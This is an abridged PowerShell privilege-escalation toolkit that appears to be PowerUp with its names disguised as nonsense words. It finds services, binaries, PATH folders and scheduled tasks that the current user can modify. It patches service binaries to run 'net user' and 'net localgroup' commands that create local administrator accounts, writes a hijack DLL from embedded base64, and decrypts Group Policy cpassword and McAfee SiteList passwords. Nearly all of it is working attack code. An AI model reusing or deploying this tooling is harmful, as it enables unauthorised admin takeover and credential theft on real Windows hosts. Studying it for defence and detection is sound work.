...
#>
    ...
    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DonkeyName] = $Module.GetType("$Namespace.$DonkeyName")
            }
            else
            {
                $TypeHash[$DonkeyName] = $Module.GetType($DonkeyName)
            }
        }
        else
        {
            if (!$TypeHash.ContainsKey($DonkeyName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DonkeyName] = $Module.DefineType("$Namespace.$DonkeyName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DonkeyName] = $Module.DefineType($DonkeyName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DonkeyName].DefineMethod(
                $FunctionName,
            ...
            $DonkeyImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DonkeyImport.GetField('SetLastError')
            $CallingConventionField = $DonkeyImport.GetField('CallingConvention')
            $CharsetField = $DonkeyImport.GetField('CharSet')
            $EntryPointField = $DonkeyImport.GetField('EntryPoint')
            ...
            $DonkeyImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DonkeyName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
            ...
            $Method.SetCustomAttribute($DonkeyImportAttribute)
        }
    }
...
function Get-MarkhorPorterhouse {
<#
...
#>
    ...
    BEGIN {
        ...
        $UguisuIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $CurrentUguisuSupper = $UguisuIdentity.Groups | Select-Object -ExpandProperty Value
        $CurrentUguisuSupper += $UguisuIdentity.User.Value
            ...
            $CandidatePaths | Sort-Object -Unique | ForEach-Object {
                ...
                Get-Acl -Path $CandidatePath | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {
                    ...
                    if($Comparison) {
                        ...
                        if($CurrentUguisuSupper -contains $IdentitySID) {
                            New-Object -TypeName PSObject -Property @{
                                MarkhorPorterhouse = $CandidatePath
        ...
        ForEach($IndividualService in $Name) {
            ...
            if($TargetService -and $TargetService.Dacl) {
                ...
                ForEach($ServiceDacl in $TargetService.Dacl) {
                    if($CurrentUguisuSupper -contains $ServiceDacl.SecurityIdentifier) {
...
function Get-ServiceUnquoted {
    ...
    if ($VulnServices) {
        ForEach ($Service in $VulnServices) {
            ...
            $ModifiableFiles = $Service.pathname.split(' ') | Get-MarkhorPorterhouse

            $ModifiableFiles | Where-Object {$_ -and $_.MarkhorPorterhouse -and ($_.MarkhorPorterhouse -ne '')} | Foreach-Object {
                ...
                $Out | Add-Member Noteproperty 'MarkhorPorterhouse' $_
                $Out | Add-Member Noteproperty 'StartName' $Service.startname
                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-ServiceBinary -Name '$($Service.name)' -Path <HamburgerPath>"
...
function Get-ModifiableServiceFile {
    ...
    Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {
        ...
        $ServicePath | Get-MarkhorPorterhouse | ForEach-Object {
            ...
            $Out | Add-Member Noteproperty 'ModifiableFile' $_.MarkhorPorterhouse
    ...
    BEGIN {
        ...
        if($PSBoundParameters['Command']) {
            ...
            if($PSBoundParameters['Credential']) {
                $UguisuNutellaToAdd = $Credential.UserName
                $PortabelloToAdd = $Credential.GetNetworkCredential().Password
            }
            else {
                $UguisuNutellaToAdd = $UguisuNutella
                $PortabelloToAdd = $Portabello
            }

            if($UguisuNutellaToAdd.Contains('\')) {
                # only adding a domain user to the local group, no user creation
                $ServiceCommands = @("net localgroup $LocalGroup $UguisuNutellaToAdd /add")
            }
            else {
                # create a local user and add it to the local specified group
                $ServiceCommands = @("net user $UguisuNutellaToAdd $PortabelloToAdd /add", "net localgroup $LocalGroup $UguisuNutellaToAdd /add")
            }
        }
    }
...
#>
    ...
    BEGIN {
        ...
        if($PSBoundParameters['Command']) {
            ...
            if($UguisuNutellaToAdd.Contains('\')) {
                # only adding a domain user to the local group, no user creation
                $ServiceCommand = "net localgroup $LocalGroup $UguisuNutellaToAdd /add"
            }
            else {
                # create a local user and add it to the local specified group
                $ServiceCommand = "net user $UguisuNutellaToAdd $PortabelloToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UguisuNutellaToAdd /add"
            }
        }
    }
    ...
    PROCESS {
        ...
        $ServiceNameBites = $Enc.GetBytes($TargetService.Name)
        $CommandBites = $Enc.GetBytes($ServiceCommand)

        # patch all values in to their appropriate locations
        for ($i=0; $i -lt ($ServiceNameBites.Length); $i++) {
            # service name offset = 2458
            $Binary[$i+2458] = $ServiceNameBites[$i]
        }
        for ($i=0; $i -lt ($CommandBites.Length); $i++) {
            # cmd offset = 2535
            $Binary[$i+2535] = $CommandBites[$i]
        }
...
#>
    ...
    PROCESS {
        ...
        $ModifiableFiles = $ServiceDetails.PathName | Get-MarkhorPorterhouse -LiteralPaths
        ...
        $ServicePath = $ModifiableFiles | Select-Object -First 1 | Select-Object -ExpandProperty MarkhorPorterhouse
...
function Find-ProcessDonkeyHamburger {
<#
    .PARAMETER Name
...
#>
    ...
    BEGIN {
        ...
        $KnownDonkeys = $(ForEach ($KeyName in $Keys.GetValueNames()) { $Keys.GetValue($KeyName) }) | Where-Object { $_.EndsWith(".dll") }
            ...
            if($TargetProcess -and $TargetProcess.Path -and ($TargetProcess.Path -ne '') -and ($TargetProcess.Path -ne $Null)) {
                ...
                try {
                    ...
                    ForEach ($Module in $LoadedModules){
                        ...
                        if ((-not $ModulePath.Contains('C:\Windows\System32')) -and (-not (Test-Path -Path $ModulePath)) -and ($KnownDonkeys -NotContains $Module.ModuleName)) {
                            ...
                            if (-not $Exclude){
                                ...
                                $Out | Add-Member Noteproperty 'ProcessHamburgerableDonkey' $ModulePath
                                $Out
                            }
                        }
                    }
...
function Find-PathDonkeyHamburger {
    ...
    Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
        ...
        $ModifidablePaths = $TargetPath | Get-MarkhorPorterhouse -LiteralPaths | Where-Object {$_ -and ($_ -ne $Null) -and ($_.MarkhorPorterhouse -ne $Null) -and ($_.MarkhorPorterhouse.Trim() -ne '')}
        ForEach($ModifidablePath in $ModifidablePaths) {
            if($ModifidablePath.MarkhorPorterhouse -ne $Null) {
...
function Write-HamburgerDonkey {
<#


    .PARAMETER DonkeyPath
...
#>
    ...
    function local:Invoke-PatchDonkey {
    <#
        .SYNOPSIS

            Helpers that patches a string in a binary byte array.

        .PARAMETER DonkeyBites
    ...
    #>
        ...
        $ReplaceStringBites = ([System.Text.Encoding]::UTF8).GetBytes($ReplaceString)

        $Index = 0
        $S = [System.Text.Encoding]::ASCII.GetString($DonkeyBites)
        ...
        for ($i=0; $i -lt $ReplaceStringBites.Length; $i++) {
            $DonkeyBites[$Index+$i]=$ReplaceStringBites[$i]
        }
    ...
    if($TargetArchitecture -eq 'x64') {
        [Byte[]]$DonkeyBites = [Byte[]][Convert]::FromBase64String($DonkeyBitesSaucyFourty)
    }
    else {
        [Byte[]]$DonkeyBites = [Byte[]][Convert]::FromBase64String($DonkeyBitesTruffleTiger)
    }
    ...
    if($PSBoundParameters['BatPath']) {
        ...
        $BasePath = $DonkeyPath | Split-Path -Parent
        $TargetBatPath = "$BasePath\debug.bat"
    }

    # patch in the appropriate .bat launcher path
    $DonkeyBites = Invoke-PatchDonkey -DonkeyBites $DonkeyBites -SearchString 'debug.bat' -ReplaceString $TargetBatPath
    ...
    Set-Content -Value $DonkeyBites -Encoding Byte -Path $DonkeyPath
    Write-Verbose "$TargetArchitecture Donkey Hamburgerer written to: $DonkeyPath"

    $Out = New-Object PSObject
    $Out | Add-Member Noteproperty 'DonkeyPath' $DonkeyPath
...
function Get-ModifiableRegistryAutoRun {
    ...
    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
        ...
        ForEach ($Name in $Keys.GetValueNames()) {
            ...
            $Path | Get-MarkhorPorterhouse | ForEach-Object {
                $Out = New-Object PSObject
    ...
    Get-ChildItem -Path $Path -Recurse | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
        try {
            ...
            if($TaskXML.Task.Triggers) {
                ...
                $TaskXML.Task.Actions.Exec.Command | Get-MarkhorPorterhouse | ForEach-Object {
                    $Out = New-Object PSObject
                ...
                $TaskXML.Task.Actions.Exec.Arguments | Get-MarkhorPorterhouse | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
            ...
            try {
                ...
                if($SiteListXml.InnerXml -Like "*password*") {
                    ...
                    $SiteListXml.SiteLists.SiteList.ChildNodes | Foreach-Object {
                        try {
                            $PortabelloRaw = $_.Password.'#Text'

                            if($_.Password.Encrypted -eq 1) {
                                # decrypt the base64 password if it's marked as encrypted
                                $DecPassword = if($PortabelloRaw) { (Get-DecryptedSitelistPassword -B64Pass $PortabelloRaw).Decrypted } else {''}
                            }
                            else {
                                $DecPassword = $PortabelloRaw
                            }
            ...
            if ($Xml.innerxml -like "*cpassword*"){
                ...
                switch ($Filename) {
                    'Groups.xml' {
                        ...
                        $UguisuNutella += , $Xml | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    ...
                    'Services.xml' {  
                        ...
                        $UguisuNutella += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'Scheduledtasks.xml' {
                        $Cpassword += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UguisuNutella += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'DataSources.xml' { 
                        $Cpassword += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UguisuNutella += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}                          
                    }
                    
                    'Printers.xml' { 
                        $Cpassword += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UguisuNutella += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
  
                    'Drives.xml' { 
                        $Cpassword += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UguisuNutella += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                    }
                }
           }
                     
           foreach ($Porta in $Cpassword) {
               Write-Verbose "Decrypting $Porta"
               $DangerousPortabello = Get-DecryptedCpassword $Porta
               Write-Verbose "Decrypted a password of $DangerousPortabello"
               #append any new passwords to array
               $Portabello += , $DangerousPortabello
           }
            
            # put [BLANK] in variables
            if (-not $Portabello) {$Portabello = '[BLANK]'}
            if (-not $UguisuNutella) {$UguisuNutella = '[BLANK]'}
            if (-not $Changed)  {$Changed = '[BLANK]'}
            if (-not $NewName)  {$NewName = '[BLANK]'}
                  
            # Create custom object to output results
            $ObjectProperties = @{'Passwords' = $Portabello;
                                  'UserNames' = $UguisuNutella;
                                  'Changed' = $Changed;
                                  'NewName' = $NewName;
                                  'File' = $File}
...
#>
    ...
    if($HTMLReport) {
        ...
        ConvertTo-HTML -Head $Header -Body "<H1>PotatoUakari report for '$($Env:ComputerName).$($Env:UserName)'</H1>" | Out-File $HtmlReportFile
    }
    ...
    if($IsAdmin){
        ...
        $CurrentUguisuSupper = Get-CurrentUserTokenGroupSid | Select-Object -ExpandProperty SID
        if($CurrentUguisuSupper -contains 'S-1-5-32-544') {
    ...
    "`n`n[*] Checking %PATH% for potentially hijackable Donkey locations..."
    $Results = Find-PathDonkeyHamburger
    $Results | Where-Object {$_} | Foreach-Object {
        $AbuseString = "Write-HamburgerDonkey -DonkeyPath '$($_.MarkhorPorterhouse)\wlbsctrl.dll'"
        $_ | Add-Member Noteproperty 'AbuseFunction' $AbuseString
        $_
    } | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>%PATH% .dll Hamburgers</H2>" | Out-File -Append $HtmlReportFile
    }
...
$Module = New-InMemoryModule -ModuleName PotatoUakariModule
...
# https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
$ServiceAccessRights = psenum $Module PotatoUakari.ServiceAccessRights UInt32 @{
...
$SidAttributes = psenum $Module PotatoUakari.SidAttributes UInt32 @{
...
$SID_AND_ATTRIBUTES = struct $Module PotatoUakari.SidAndAttributes @{
    Sid         =   field 0 IntPtr
    Attributes  =   field 1 UInt32
}

$TOKEN_GROUPS = struct $Module PotatoUakari.TokenGroups @{
    GroupCount  = field 0 UInt32
    Groups      = field 1 $SID_AND_ATTRIBUTES.MakeArrayType() -MarshalAs @('ByValArray', 32)
}

$Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'PotatoUakari.NativeMethods'
